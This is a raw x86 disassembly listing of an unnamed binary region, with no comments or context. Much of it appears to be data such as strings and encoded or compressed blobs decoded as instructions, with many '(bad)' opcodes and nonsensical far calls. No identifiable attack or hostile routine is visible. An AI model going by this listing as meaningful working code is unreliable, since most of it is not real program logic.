  413a2c:	cmp    DWORD PTR [edi+0x3],ecx
  413a2f:	dec    edi
  413a30:	xor    eax,0x364ec24f
  413a35:	dec    edi
  413a36:	push   ds
  413a37:	sbb    BYTE PTR [edi],0x83
  413a3a:	setae  BYTE PTR [eax]
  413a3d:	nop
  413a3e:	js     0x4139e0
  413a40:	jns    0x4139e3
  413a42:	aas    
  413a43:	dec    edi
  413a44:	jbe    0x413a95
  413a46:	ret    0x764e
  413a49:	dec    edi
  413a4a:	ds dec edi
  413a4c:	dec    esp
  413a4d:	dec    edi
  413a4e:	cmp    DWORD PTR [edi+0x69],ecx
  413a51:	dec    edi
  413a52:	xor    eax,0x364ec24f
  413a57:	dec    edi
  413a58:	push   ds
  413a59:	xchg   edx,eax
  413a5a:	pop    ds
  413a5b:	xchg   ebx,eax
  413a5c:	bt     DWORD PTR [eax],ecx
  413a5f:	mov    al,ds:0xb179b078
  413a64:	aas    
  413a65:	dec    edi
  413a66:	push   0x4e4ec24f
  413a6b:	dec    edi
  413a6c:	cmp    eax,0x394f034f
  413a71:	dec    edi
  413a72:	push   ecx
  413a73:	dec    edi
  413a74:	xor    al,0x4f
  413a76:	ret    0x364e
  413a79:	dec    edi
  413a7a:	push   ds
  413a7b:	mov    ds:0xb30fa31f,al
  413a80:	or     BYTE PTR [eax-0x3e863f88],dh
  413a86:	aas    
  413a87:	dec    edi
  413a88:	push   0x4e4ec24f
  413a8d:	dec    edi
  413a8e:	cmp    eax,0x394f784f
  413a93:	dec    edi
  413a94:	pop    edi
  413a95:	dec    edi
  413a96:	cmp    ecx,DWORD PTR [edi-0x3e]
  413a99:	dec    esi
  413a9a:	xor    eax,0x1fb21e4f
  413a9f:	mov    bl,0xf
  413aa1:	ret    
  413aa2:	or     al,al
  413aa4:	js     0x413a76
  413aa6:	jns    0x413a79
  413aa8:	aas    
  413aa9:	dec    edi
  413aaa:	push   0x4e4ec24f
  413aaf:	dec    edi
  413ab0:	cmp    eax,0x394f724f
  413ab5:	dec    edi
  413ab6:	dec    esi
  413ab7:	dec    edi
  413ab8:	xor    al,0x4f
  413aba:	ret    0x304e
  413abd:	dec    edi
  413abe:	push   ds
  413abf:	ret    0xc31f
  413ac2:	psrlq  mm1,QWORD PTR [eax]
  413ac5:	sar    BYTE PTR [eax-0x20],1
  413ac8:	jns    0x413aab
  413aca:	aas    
  413acb:	dec    edi
  413acc:	push   0x4e4ec24f
  413ad1:	dec    edi
  413ad2:	cmp    eax,0x394f734f
  413ad7:	dec    edi
  413ad8:	dec    esp
  413ad9:	dec    edi
  413ada:	xor    al,0x4f
  413adc:	ret    0x364e
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	rcr    BYTE PTR [edi],cl
  413ae3:	ror    DWORD PTR [edi],cl
  413ae5:	jecxz  0x413aef
  413ae7:	loopne 0x413b61
  413ae9:	lock jns 0x413add
  413aec:	aas    
  413aed:	dec    edi
  413aee:	ins    DWORD PTR es:[edi],dx
  413aef:	dec    edi
  413af0:	ret    0x5f4e
  413af3:	dec    edi
  413af4:	cmp    eax,0x3e4f524f
  413af9:	dec    edi
  413afa:	ret    0x3f4e
  413afd:	dec    edi
  413afe:	push   ds
  413aff:	loop   0x413b20
  413b01:	jecxz  0x413b12
  413b03:	repz or al,dh
  413b06:	js     0x413b08
  413b08:	jns    0x413b0b
  413b0a:	js     0x413b1c
  413b0c:	jns    0x413b1f
  413b0e:	ds dec edi
  413b10:	jg     0x413b61
  413b12:	ret    0x5b4e
  413b15:	dec    edi
  413b16:	cmp    al,0x4f
  413b18:	jb     0x413b69
  413b1a:	ds dec edi
  413b1c:	dec    ebp
  413b1d:	dec    edi
  413b1e:	cmp    ecx,DWORD PTR [edi-0x3e]
  413b21:	dec    esi
  413b22:	xor    eax,0x1f021e4f
  413b27:	add    ecx,DWORD PTR [edi]
  413b29:	adc    ecx,DWORD PTR [eax]
  413b2b:	adc    BYTE PTR [eax+0x20],bh
  413b2e:	jns    0x413b51
  413b30:	aas    
  413b31:	dec    edi
  413b32:	add    BYTE PTR [eax],al
  413b34:	mov    esp,0xb0004139
  413b39:	cmp    eax,DWORD PTR [ecx+0x0]
  413b3c:	mov    eax,0x1800413b
  413b41:	ds inc ecx
  413b43:	add    BYTE PTR [ebp+edi*1+0x41],bh
  413b47:	add    BYTE PTR [eax],cl
  413b49:	ds inc ecx
  413b4b:	add    BYTE PTR [eax-0x63ffbec5],bl
  413b51:	cmp    eax,DWORD PTR [ecx+0x0]
  413b54:	add    BYTE PTR [esi],bh
  413b56:	inc    ecx
  413b57:	add    BYTE PTR [eax],al
  413b59:	cmp    al,0x41
  413b5b:	add    BYTE PTR [edx-0x4e076357],cl
  413b61:	mov    edx,0x3bb4f89c
  413b66:	inc    ecx
  413b67:	add    BYTE PTR [eax],bh
  413b69:	cmp    eax,0x3d4c0041
  413b6e:	inc    ecx
  413b6f:	add    BYTE PTR [eax+0x3d],bl
  413b72:	inc    ecx
  413b73:	add    BYTE PTR [eax+0x3d],ch
  413b76:	inc    ecx
  413b77:	add    ah,ch
  413b79:	cmp    eax,DWORD PTR [ecx+0x0]
  413b7c:	mov    eax,0xc004139
  413b81:	cmp    al,0x41
  413b83:	add    ah,bh
  413b85:	cmp    eax,DWORD PTR [ecx+0x0]
  413b88:	sbb    al,0x3e
  413b8a:	inc    ecx
  413b8b:	add    BYTE PTR [ecx],dh
  413b8d:	test   DWORD PTR [eax+edi*8-0x7ee8f462],ebx
  413b94:	sar    BYTE PTR [ebx],0x41
  413b97:	add    BYTE PTR [ebx-0x707ee9e4],dl
  413b9d:	or     eax,0x705
  413ba2:	inc    eax
  413ba3:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413ba7:	(bad)  
  413ba9:	xor    eax,0x68720043
  413bae:	inc    ebp
  413baf:	inc    ecx
  413bb0:	(bad)  
  413bb1:	cli    
  413bb2:	jne    0x413c16
  413bb4:	(bad)  
  413bb5:	in     eax,dx
  413bb6:	inc    BYTE PTR [edi]
  413bb8:	mov    eax,0xa805a3fa
  413bbd:	cmp    eax,DWORD PTR [ecx+0x0]
  413bc0:	xor    dl,BYTE PTR [ebp-0x69cd0764]
  413bc6:	pushf  
  413bc7:	clc    
  413bc8:	xor    edx,DWORD PTR [ebp-0x6ac30764]
  413bce:	pushf  
  413bcf:	clc    
  413bd0:	cmp    eax,0x3ef89c95
  413bd5:	xchg   ebp,eax
  413bd6:	pushf  
  413bd7:	clc    
  413bd8:	aas    
  413bd9:	xchg   ebp,eax
  413bda:	pushf  
  413bdb:	clc    
  413bdc:	cmp    BYTE PTR [ebp-0x6ac60764],dl
  413be2:	pushf  
  413be3:	clc    
  413be4:	cmp    dl,BYTE PTR [ebp-0x6ade0764]
  413bea:	pushf  
  413beb:	clc    
  413bec:	in     eax,dx
  413bed:	stc    
  413bee:	add    esp,DWORD PTR [eax-0x50]
  413bf1:	cmp    DWORD PTR [ecx+0x0],eax
  413bf4:	je     0x413bf6
  413bf6:	inc    ebx
  413bf7:	add    BYTE PTR [ecx+0x49],bl
  413bfa:	imul   si,WORD PTR [ecx],0xff85
  413bfe:	pushf  
  413bff:	clc    
  413c00:	sahf   
  413c01:	jmp    0x4f04356
  413c06:	add    BYTE PTR [eax],al
  413c08:	lods   al,BYTE PTR ds:[esi]
  413c09:	cmp    DWORD PTR [ecx+0x0],eax
  413c0c:	pushf  
  413c0d:	or     eax,DWORD PTR [esi+ecx*1]
	...
  413c40:	addr16 jg 0x413c83
  413c43:	add    dl,ch
  413c45:	adc    BYTE PTR [ebx+0x0],al
  413c48:	add    BYTE PTR [eax],al
  413c4a:	add    BYTE PTR [eax],al
  413c4c:	inc    esp
  413c4d:	add    BYTE PTR [esi+0x0],al
  413c50:	imul   eax,DWORD PTR [eax],0x4a006f
  413c56:	dec    ecx
  413c57:	add    BYTE PTR [eax+eax*1+0x46],al
  413c5b:	add    BYTE PTR [eax+eax*1+0x49],cl
  413c5f:	add    BYTE PTR [ebp+0x0],dl
  413c62:	inc    esi
  413c63:	add    BYTE PTR [edi+0x0],cl
  413c66:	imul   eax,DWORD PTR [eax],0x6f
  413c69:	add    BYTE PTR [edx+0x0],ch
  413c6c:	dec    ebx
  413c6d:	add    BYTE PTR [eax+eax*1+0x66],cl
  413c71:	add    BYTE PTR [edx+0x0],ch
  413c74:	imul   eax,DWORD PTR [eax],0x46006f
  413c7a:	jo     0x413c7c
  413c7c:	outs   dx,DWORD PTR ds:[esi]
  413c7d:	add    BYTE PTR [ebx+0x0],ch
  413c80:	ins    DWORD PTR es:[edi],dx
  413c81:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413c85:	add    BYTE PTR [ebx+0x0],dh
  413c88:	ins    BYTE PTR es:[edi],dx
  413c89:	add    BYTE PTR [edx+0x0],ch
  413c8c:	data16 add BYTE PTR [edi+0x0],ah
  413c90:	imul   eax,DWORD PTR [eax],0x64006f
  413c96:	add    BYTE PTR [di+0x0],dh
  413c9a:	imul   eax,DWORD PTR [eax],0x69006a
  413ca0:	outs   dx,DWORD PTR ds:[esi]
  413ca1:	add    BYTE PTR [esi+0x0],ah
  413ca4:	add    BYTE PTR fs:[ebp+0x0],dh
  413ca8:	push   0x0
  413caa:	add    BYTE PTR [bp+0x0],ah
  413cae:	add    BYTE PTR fs:[eax],al
  413cb1:	add    BYTE PTR [eax],al
  413cb3:	add    BYTE PTR [edx+0x0],cl
  413cb6:	inc    esp
  413cb7:	add    BYTE PTR [ebx+0x0],cl
  413cba:	dec    edx
  413cbb:	add    BYTE PTR [edx+0x0],ch
  413cbe:	imul   eax,DWORD PTR [eax],0x64
  413cc1:	add    BYTE PTR [ebx+0x0],cl
  413cc4:	dec    esp
  413cc5:	add    BYTE PTR [edx+0x0],cl
  413cc8:	add    BYTE PTR fs:[ecx+0x0],ch
  413ccc:	ins    BYTE PTR es:[edi],dx
  413ccd:	add    BYTE PTR [edx+0x0],cl
  413cd0:	ins    BYTE PTR es:[edi],dx
  413cd1:	add    BYTE PTR [ebx+0x0],ch
  413cd4:	add    BYTE PTR fs:[edx+0x0],ch
  413cd8:	dec    esp
  413cd9:	add    BYTE PTR [ebp+0x0],dl
  413cdc:	inc    esp
  413cdd:	add    BYTE PTR [edi+0x0],ch
  413ce0:	imul   eax,DWORD PTR [eax],0x73006c
  413ce6:	push   0x0
  413ce8:	add    BYTE PTR fs:[ebx+0x0],ch
  413cec:	imul   eax,DWORD PTR [eax],0x6a
  413cef:	add    BYTE PTR [esi+0x0],ah
  413cf2:	add    BYTE PTR fs:[ebx+0x0],dh
  413cf6:	imul   eax,DWORD PTR [eax],0x6a
  413cf9:	add    BYTE PTR [esi+0x0],ah
  413cfc:	imul   eax,DWORD PTR [eax],0x64
  413cff:	add    BYTE PTR [ebx+0x0],dh
  413d02:	add    BYTE PTR [eax],al
  413d04:	dec    edx
  413d05:	inc    esp
  413d06:	dec    ebx
  413d07:	dec    edx
  413d08:	push   0x6b
  413d0a:	fs dec ebx
  413d0c:	dec    esp
  413d0d:	dec    edx
  413d0e:	imul   ebp,DWORD PTR fs:[edx+ecx*2+0x6c],0x4c6a646b
  413d17:	push   ebp
  413d18:	inc    esp
  413d19:	outs   dx,DWORD PTR ds:[esi]
  413d1a:	imul   ebp,DWORD PTR [ebx+esi*2+0x6a],0x6a6b6b64
  413d22:	data16 fs jae 0x413d91
  413d26:	push   0x66
  413d28:	imul   esp,DWORD PTR [ebx+esi*2+0x0],0x0
  413d2d:	add    BYTE PTR [eax],al
  413d2f:	add    BYTE PTR [eax],al
  413d31:	add    BYTE PTR [eax],al
  413d33:	add    BYTE PTR [ebp-0x68],cl
  413d36:	inc    eax
  413d37:	add    BYTE PTR [ebp+0x4f],dl
  413d3a:	pop    edi
  413d3b:	dec    edi
  413d3c:	dec    esp
  413d3d:	dec    edi
  413d3e:	push   eax
  413d3f:	dec    edi
  413d40:	pop    edi
  413d41:	dec    edi
  413d42:	push   esi
  413d43:	dec    edi
  413d44:	or     eax,0xc24f0c4f
  413d49:	dec    esi
  413d4a:	add    BYTE PTR [eax],al
  413d4c:	pop    ecx
  413d4d:	dec    edi
  413d4e:	pop    esi
  413d4f:	dec    edi
  413d50:	pop    ebx
  413d51:	dec    edi
  413d52:	or     eax,0xc24f0c4f
  413d57:	dec    esi
  413d58:	dec    edi
  413d59:	dec    edi
  413d5a:	dec    ebp
  413d5b:	dec    edi
  413d5c:	pop    edi
  413d5d:	dec    edi
  413d5e:	dec    esp
  413d5f:	dec    edi
  413d60:	or     eax,0xc24f0c4f
  413d65:	dec    esi
  413d66:	add    BYTE PTR [eax],al
  413d68:	dec    ebp
  413d69:	dec    edi
  413d6a:	pop    edx
  413d6b:	dec    edi
  413d6c:	push   esi
  413d6d:	dec    edi
  413d6e:	dec    ecx
  413d6f:	dec    edi
  413d70:	arpl   WORD PTR [edi+0x52],cx
  413d73:	dec    edi
  413d74:	pop    ebx
  413d75:	dec    edi
  413d76:	ret    0x4e
  413d79:	add    BYTE PTR [eax],al
  413d7b:	add    BYTE PTR [esi+0x7d],ch
  413d7e:	outs   dx,BYTE PTR ds:[esi]
  413d7f:	lea    ebp,[esi-0x63]
  413d82:	outs   dx,BYTE PTR ds:[esi]
  413d83:	lods   eax,DWORD PTR ds:[esi]
  413d84:	outs   dx,BYTE PTR ds:[esi]
  413d85:	mov    ebp,0xdd6ecd6e
  413d8a:	outs   dx,BYTE PTR ds:[esi]
  413d8b:	in     eax,dx
  413d8c:	outs   dx,BYTE PTR ds:[esi]
  413d8d:	std    
  413d8e:	outs   dx,BYTE PTR ds:[esi]
  413d8f:	or     eax,0x2d6e1d6e
  413d94:	outs   dx,BYTE PTR ds:[esi]
  413d95:	cmp    eax,0x6d6e5d6e
  413d9a:	outs   dx,BYTE PTR ds:[esi]
  413d9b:	jb     0x413e0b
  413d9d:	jae    0x413e0d
  413d9f:	jo     0x413e0f
  413da1:	jno    0x413e11
  413da3:	jbe    0x413e13
  413da5:	ja     0x413e15
  413da7:	je     0x413e17
  413da9:	jne    0x413e19
  413dab:	mov    ch,BYTE PTR [esi-0x75]
  413dae:	outs   dx,BYTE PTR ds:[esi]
  413daf:	mov    BYTE PTR [esi-0x77],ch
  413db2:	outs   dx,BYTE PTR ds:[esi]
  413db3:	mov    gs,WORD PTR [esi+0x7c]
  413db6:	pop    esi
  413db7:	jge    0x413e07
  413db9:	jge    0x413d79
  413dbb:	jge    0x413e15
  413dbd:	(bad)  
  413dbe:	jns    0x413e30
  413dc0:	mov    ecx,0x7d736eb1
  413dc5:	bound  ebp,QWORD PTR [edx+0x7c265fc6]
  413dcb:	add    BYTE PTR [ecx+0x17],cl
  413dce:	mov    ebx,0x4af4b956
  413dd3:	aaa    
  413dd4:	dec    edx
  413dd5:	jle    0x413d70
  413dd7:	jno    0x413e39
  413dd9:	mov    cl,0x4
  413ddb:	imul   ebp,DWORD PTR [eax-0x70282bf8],0x5
  413de2:	inc    esp
  413de3:	xlat   BYTE PTR ds:[ebx]
  413de4:	rcl    DWORD PTR [ebx+0x7dd01148],1
  413dea:	rcr    esi,cl
  413dec:	(bad)  
  413ded:	leave  
  413dee:	xchg   BYTE PTR [esi+0x1faa3210],ah
  413df4:	fs icebp 
  413df6:	push   eax
  413df7:	(bad)  
  413df8:	rcr    DWORD PTR [eax],1
  413dfa:	shl    DWORD PTR [ecx+0x0],1
  413dfd:	add    BYTE PTR [eax],al
  413dff:	add    bh,ch
  413e01:	(bad)  [ebx+0x7]
  413e04:	or     BYTE PTR [ecx+eax*2],bh
  413e07:	add    BYTE PTR [esi+0x30],al
  413e0a:	shl    DWORD PTR [ebx],0x38
  413e0d:	and    eax,DWORD PTR [ecx+0x0]
  413e10:	inc    esi
  413e11:	push   ebx
  413e12:	outs   dx,DWORD PTR ds:[esi]
  413e13:	push   ebx
  413e14:	mov    al,ds:0x400413b
  413e19:	cmp    al,0x41
  413e1b:	add    BYTE PTR [edi+0x712ed],cl
	...
  413e3d:	add    BYTE PTR [eax],al
  413e3f:	add    BYTE PTR [edi+0x78],dl
  413e42:	popa   
  413e43:	push   edi
  413e44:	push   esi
  413e45:	push   esp
  413e46:	dec    eax
  413e47:	je     0x413e95
  413e49:	push   ebx
  413e4a:	jne    0x413eb7
  413e4c:	popa   
  413e4d:	jns    0x413e94
  413e4f:	pop    ecx
  413e50:	je     0x413e9a
  413e52:	push   ebp
  413e53:	jp     0x413eab
  413e55:	jp     0x413ed0
  413e57:	js     0x413ec9
  413e59:	imul   edx,DWORD PTR [edi+0x6d],0x48
  413e5d:	push   eax
  413e5e:	dec    eax
  413e5f:	dec    edx
  413e60:	outs   dx,BYTE PTR ds:[esi]
  413e61:	push   esp
  413e62:	pop    ecx
  413e63:	dec    edx
  413e64:	dec    ebx
  413e65:	dec    ebp
  413e66:	dec    esi
  413e67:	je     0x413e69
	...
  413e79:	add    BYTE PTR [eax],al
  413e7b:	add    BYTE PTR [ebp+0x70],ch
  413e7e:	ins    DWORD PTR es:[edi],dx
  413e7f:	push   esp
  413e80:	dec    esi
  413e81:	jne    0x413ed4
  413e83:	outs   dx,BYTE PTR ds:[esi]
  413e84:	imul   eax,DWORD PTR [edx+0x73],0x58516165
  413e8b:	pop    ecx
  413e8c:	outs   dx,BYTE PTR ds:[esi]
  413e8d:	jbe    0x413f07
  413e8f:	jns    0x413f08
  413e91:	dec    ebp
  413e92:	je     0x413f0a
  413e94:	bound  eax,QWORD PTR [ebx+eiz*2+0x7a]
  413e98:	push   esp
  413e99:	arpl   WORD PTR [ecx+0x4b],cx
  413e9c:	push   edx
  413e9d:	imul   ebp,DWORD PTR [eax+0x73],0x6a4a5170
  413ea4:	add    BYTE PTR [eax],al
  413ea6:	inc    edi
  413ea7:	jne    0x413eef
  413ea9:	push   ebx
  413eaa:	outs   dx,DWORD PTR ds:[esi]
  413eab:	push   ebx
  413eac:	inc    esi
  413ead:	inc    edi
  413eae:	push   0x66495949
  413eb3:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413eb7:	push   esi
  413eb8:	jb     0x413f22
  413eba:	add    BYTE PTR [eax],al
  413ebc:	ins    BYTE PTR es:[edi],dx
  413ebd:	jb     0x413f38
  413ebf:	inc    edi
  413ec0:	push   edi
  413ec1:	push   esi
  413ec2:	inc    edi
  413ec3:	ins    BYTE PTR es:[edi],dx
  413ec4:	inc    ecx
  413ec5:	inc    edi
  413ec6:	jae    0x413ec8
  413ec8:	dec    edi
  413ec9:	inc    ebx
  413eca:	jo     0x413f3e
  413ecc:	data16 jp 0x413f21
  413ecf:	jp     0x413f29
  413ed1:	ins    BYTE PTR es:[edi],dx
  413ed2:	je     0x413f43
  413ed4:	jns    0x413f44
  413ed6:	popa   
  413ed7:	push   esi
  413ed8:	push   ebp
  413ed9:	push   0x57564476
  413ede:	dec    edx
  413edf:	imul   edx,DWORD PTR [ebx+0x4b],0x5065
  413ee6:	inc    ecx
  413ee7:	jp     0x413f59
  413ee9:	pop    eax
  413eea:	inc    esi
  413eeb:	jae    0x413f62
  413eed:	dec    esi
  413eee:	dec    edx
  413eef:	gs push eax
  413ef1:	jne    0x413ef3
  413ef3:	add    ah,ah
  413ef5:	cmc    
  413ef6:	jnp    0x413f46
  413ef8:	jnp    0x413ec8
  413efa:	cmc    
  413efb:	call   FWORD PTR [ebx+0x61]
  413efe:	and    bh,dl
  413f00:	dec    edx
  413f01:	cmp    ah,al
  413f03:	dec    edi
  413f04:	(bad)  
  413f06:	add    BYTE PTR [eax],al
  413f08:	add    eax,0xf1000001
  413f0d:	add    al,0xe3
  413f0f:	test   al,0x83
  413f11:	in     al,0x94
  413f13:	enter  0xc53c,0x71
  413f17:	(bad)  
  413f18:	adc    eax,0x940943b5
  413f1d:	mov    ebx,0x6b846062
  413f22:	mov    edi,0xa1411850
  413f27:	sbb    ah,BYTE PTR [esi+0x9]
  413f2a:	fs call 0x4c27:0xbd0a490f
  413f32:	loop   0x413f69
  413f34:	xor    esp,DWORD PTR [ebp-0x30]
  413f37:	test   BYTE PTR [esp+eiz*4],0x90
  413f3b:	jl     0x413ed3
  413f3d:	dec    ebp
  413f3e:	mov    dl,0x8a
  413f40:	push   es
  413f41:	xor    edi,DWORD PTR [ecx+0x7c33cd6b]
  413f47:	inc    ebp
  413f48:	pop    ecx
  413f49:	cdq    
  413f4a:	retf   
  413f4b:	arpl   WORD PTR [ebx+0x27],si
  413f4e:	shl    ecx,cl
  413f50:	adc    al,0x85
  413f52:	add    DWORD PTR [esi+ebp*8-0x516851cf],edx
  413f59:	popf   
  413f5a:	cmp    BYTE PTR [esi+ebp*8],dl
  413f5d:	cs dec edi
  413f5f:	faddp  st(2),st
  413f61:	repz jmp 0xcab02a7b
  413f67:	shl    BYTE PTR [ecx],cl
  413f69:	or     eax,0x85d0ea8b
  413f6e:	jg     0x413fbe
  413f70:	imul   eax,DWORD PTR [ebx-0x79f9ad98],0xcef98651
  413f7a:	ss cmp esp,esi
  413f7d:	pop    edi
  413f7e:	push   esi
  413f7f:	dec    esp
  413f80:	mov    ah,BYTE PTR [edi+ebx*4+0x6f0b0d3d]
  413f87:	aas    
  413f88:	ins    DWORD PTR es:[edi],dx
  413f89:	aad    0x43
  413f8b:	fwait
  413f8c:	push   ebp
  413f8d:	sub    edi,ecx
  413f8f:	fs jb  0x413f6d
  413f92:	jmp    0x3e3317f8
  413f97:	repnz loope 0x413fc7
  413f9a:	add    cl,BYTE PTR ds:0xff1005f2
  413fa0:	or     BYTE PTR [edx],bh
  413fa2:	sbb    al,0x94
  413fa4:	sbb    eax,0x8d8f7bec
  413fa9:	inc    ebp
  413faa:	push   cs
  413fab:	fdiv   st(6),st
  413fad:	sbb    esi,DWORD PTR [ecx-0x4831347d]
  413fb3:	and    BYTE PTR [eax+0x2f64ad60],0xae
  413fba:	loopne 0x413f43
  413fbc:	cmp    edx,DWORD PTR [edi+0x2c9ae7c8]
  413fc2:	inc    si
  413fc4:	fidivr DWORD PTR [ebx+0x24d3ca45]
  413fca:	lods   al,BYTE PTR ds:[esi]
  413fcb:	sub    BYTE PTR [edx+0x7a3490d6],ch
  413fd1:	dec    ebx
  413fd2:	dec    edx
  413fd3:	rcr    ah,0x2b
  413fd6:	das    
  413fd7:	mov    dh,0x2d
  413fd9:	cmp    al,0xf7
  413fdb:	xor    DWORD PTR [ebx],esi
  413fdd:	sbb    DWORD PTR [edx+ebp*2+0x3c],esp
  413fe1:	imul   esp,esi,0x32
  413fe4:	inc    ecx
  413fe5:	sti    
  413fe6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413fe7:	addr16 mov eax,ds:0xf1cb
  413feb:	mov    al,0xd7
  413fed:	dec    ebx
  413fee:	loop   0x413f96
  413ff0:	push   0x371f364b
  413ff5:	out    0x58,eax
  413ff7:	call   0x99071d2e
  413ffc:	sets   ch
  413fff:	pusha  
  414000:	mov    al,0xce
  414002:	or     eax,0xe45cebff
  414007:	sub    edx,DWORD PTR [ecx]
  414009:	(bad)  
  41400a:	add    DWORD PTR [esi],0x7c2f19da
  414010:	cdq    
	...
  414071:	add    BYTE PTR [eax],al
  414073:	add    BYTE PTR [edx-0x26],bl
  414076:	push   esi
  414077:	pusha  
  414078:	(bad)  
  414079:	in     al,dx
  41407a:	jle    0x414076
  41407c:	call   0x5ca8:0x99d52e96
  414083:	xor    al,0xe1
  414085:	rol    BYTE PTR [eax],cl
  414087:	add    BYTE PTR ds:0xc7000001,al
  41408d:	sbb    esi,DWORD PTR [esi-0x4f782872]
  414093:	jmp    DWORD PTR [eax+ecx*8]
  414096:	adc    al,0xf0
  414098:	dec    eax
  414099:	mov    bh,0x93
  41409b:	push   ebx
  41409c:	sbb    al,0x5d
  41409e:	xchg   edi,eax
  41409f:	je     0x414110
  4140a1:	icebp  
  4140a2:	xor    dh,ch
  4140a4:	in     al,0xd4
  4140a6:	data16 out 0x33,al
  4140a9:	je     0x414081
  4140ab:	inc    ebp
  4140ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140ad:	jecxz  0x414076
  4140af:	jp     0x41409f
  4140b1:	les    esp,FWORD PTR [edx+0x492d727b]
  4140b7:	inc    ebx
  4140b8:	cli    
  4140b9:	sbb    BYTE PTR [ebp-0x30],ch
  4140bc:	mov    eax,ds:0x43c2df28
  4140c1:	dec    ebx
  4140c2:	adc    BYTE PTR [ebx+esi*8+0x79d13c2a],bl
  4140c9:	xor    BYTE PTR [edi-0x41],ch
  4140cc:	aaa    
  4140cd:	ins    BYTE PTR es:[edi],dx
  4140ce:	mov    edi,ebx
  4140d0:	and    ah,cl
  4140d2:	jecxz  0x414132
  4140d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140d5:	or     eax,0x3fb71142
  4140da:	fs stos BYTE PTR es:[edi],al
  4140dc:	sbb    dl,bh
  4140de:	mov    ch,0xff
  4140e0:	call   0x6ac5:0xdbd56dbf
  4140e7:	pop    ebp
  4140e8:	pop    ebx
  4140e9:	xor    DWORD PTR [ecx+0x574a689e],ebp
  4140ef:	mov    cl,0x81
  4140f1:	mov    WORD PTR [edi+0x4785c56a],es
  4140f7:	mov    BYTE PTR [ebx-0x4e],ah
  4140fa:	out    dx,eax
  4140fb:	(bad)  
  4140fc:	out    0xf9,al
  4140fe:	push   esp
  4140ff:	cmp    BYTE PTR [ebx],al
  414101:	push   ebp
  414102:	jmp    0x9deedeb
  414107:	jo     0x41412f
  414109:	or     al,0xed
  41410b:	sub    BYTE PTR [eax+edi*1+0x3a7429e3],0xa7
  414113:	push   eax
  414114:	ss aad 0x30
  414117:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414118:	data16 outs dx,BYTE PTR ds:[esi]
  41411a:	imul   DWORD PTR [eax+ecx*2]
  41411d:	push   ecx
  41411e:	sahf   
  41411f:	fstp   TBYTE PTR [edx-0x65]
  414122:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414123:	shr    edi,1
  414125:	inc    eax
  414126:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414127:	mov    eax,ds:0x6f1c66e3
  41412c:	ds es jmp 0x41417c
  414130:	xor    al,0xb1
  414132:	add    al,0x68
  414134:	mov    al,0x54
  414136:	inc    ecx
  414137:	cmp    DWORD PTR [edi+0x53],esi
  41413a:	cmc    
  41413b:	pop    esp
  41413c:	jb     0x4140e6
  41413e:	pusha  
  41413f:	xchg   edx,eax
  414140:	rcr    DWORD PTR [edi+0x37],cl
  414143:	sub    ch,ch
  414145:	mov    cs,WORD PTR [edx-0x2a]
  414148:	ins    DWORD PTR es:[edi],dx
  414149:	pushf  
  41414a:	mov    ds:0xe2285622,eax
  41414f:	icebp  
  414150:	xor    eax,0x7359a683
  414155:	cmp    DWORD PTR [ebx-0x64],edi
  414158:	ins    DWORD PTR es:[edi],dx
  414159:	dec    edx
  41415a:	mov    edi,0xaa61fd6f
  41415f:	jno    0x41418b
  414161:	mov    ebx,0x7364f69
  414166:	or     eax,0x56e2fe3f
  41416b:	inc    eax
  41416c:	xor    DWORD PTR [ebx+0x19f2f913],esp
  414172:	jns    0x4141b3
  414174:	cmc    
  414175:	sbb    ecx,DWORD PTR ss:[ecx+0x4c]
  414179:	shl    ebx,cl
  41417b:	aas    
  41417c:	mov    ss,WORD PTR [edi-0x29caf40f]
  414182:	ret    
  414183:	inc    edi
  414184:	cmp    BYTE PTR [ecx+eiz*1],dh
  414187:	sub    al,0x11
  414189:	pop    es
  41418a:	in     al,0xa6
  41418c:	int    0x66
  41418e:	push   ss
  41418f:	ror    BYTE PTR [esi+0x0],0x0
	...
  4141f3:	add    BYTE PTR [edx],al
  4141f5:	adc    al,BYTE PTR [ecx]
  4141f7:	mov    ds:0xb3a2b311,eax
  4141fc:	mov    DWORD PTR [ecx+0x37],edx
  4141ff:	push   edi
  414200:	mov    eax,0xe6b86446
  414205:	rol    DWORD PTR [eax],cl
  414207:	add    BYTE PTR ds:0xce000001,al
  41420d:	xchg   ecx,eax
  41420e:	sub    al,0xa0
  414210:	mov    ah,0xa8
  414212:	stc    
  414213:	mov    esi,0x519b4165
  414218:	mov    edi,0x19844bc4
  41421d:	mov    esp,0x511f13d6
  414222:	leave  
  414223:	push   esp
  414224:	ds mov ecx,0x5db7f64d
  41422a:	fist   WORD PTR [ebx]
  41422c:	push   cs
  41422d:	and    BYTE PTR [edi-0x6b],ah
  414230:	pop    ebp
  414231:	mov    bl,BYTE PTR [ebp-0x66]
  414234:	jp     0x41428d
  414236:	fisubr WORD PTR [esi+0x680d76b0]
  41423c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41423d:	cmp    ah,BYTE PTR [esi]
  41423f:	push   edi
  414240:	jp     0x41427a
  414242:	xor    BYTE PTR [edx],dl
  414244:	add    ebx,DWORD PTR [ebp+ebp*2-0xb9fef86]
  41424b:	les    eax,FWORD PTR [eax-0xc3638ac]
  414251:	xchg   edx,eax
  414252:	jb     0x414233
  414254:	and    al,0xe9
  414256:	mov    ecx,0xc94fba53
  41425b:	std    
  41425c:	mov    ds:0x5fccefa,al
  414261:	pusha  
  414262:	call   0xfe7c5fa2
  414267:	cmp    esi,DWORD PTR [esi+eax*2]
  41426a:	mov    ds:0xa0bf92bd,eax
  41426f:	fisttp DWORD PTR [ebx-0x5d826e1a]
  414275:	cmp    DWORD PTR [ebp+0x41435118],ecx
  41427b:	in     al,dx
  41427c:	sub    al,0x7e
  41427e:	jbe    0x41420a
  414280:	xchg   DWORD PTR [ecx+eiz*8+0x36],esp
  414284:	repz inc edi
  414286:	sbb    al,0x39
  414288:	mov    WORD PTR ds:0x9829595e,?
  41428e:	scas   al,BYTE PTR es:[edi]
  41428f:	stos   BYTE PTR es:[edi],al
